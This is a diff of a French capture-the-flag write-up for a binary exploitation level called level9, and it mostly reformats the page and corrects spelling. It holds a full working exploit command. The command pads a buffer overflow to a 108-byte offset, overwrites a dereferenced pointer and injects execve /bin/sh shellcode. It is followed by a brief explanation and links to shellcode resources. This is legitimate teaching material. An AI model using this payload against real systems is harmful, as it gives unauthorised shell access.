@@ -1,10 +1,13 @@
 **Exploit**:
 
-**Commande**: `/level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')`
+**Commande**:  
+```bash
+/level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
+```
 
 **Explication**: 
 
-l offset est egale a 108 car la data est malloc a 6c
+l'offset est égale a 108 car la data est malloc a 6c
 ensuite on vois que eax cela overflow a sur eax et qu'il est dereferencer
 il suffira de faire un ret to libc ou un shellcode grace a l adresse de eax afin de lancer un shell
 
@@ -58,5 +61,5 @@ eax            0x804a00c	134520844
 \x0c\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"
 
 **Ressources**:
-https://shell-storm.org/shellcode/files/shellcode-827.html
-https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
+[Shellcode - shell-storm.org](https://shell-storm.org/shellcode/files/shellcode-827.html)  
+[Générateur de Pattern pour Overflow Exploit - ZeroSum0x0 Blog](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html)
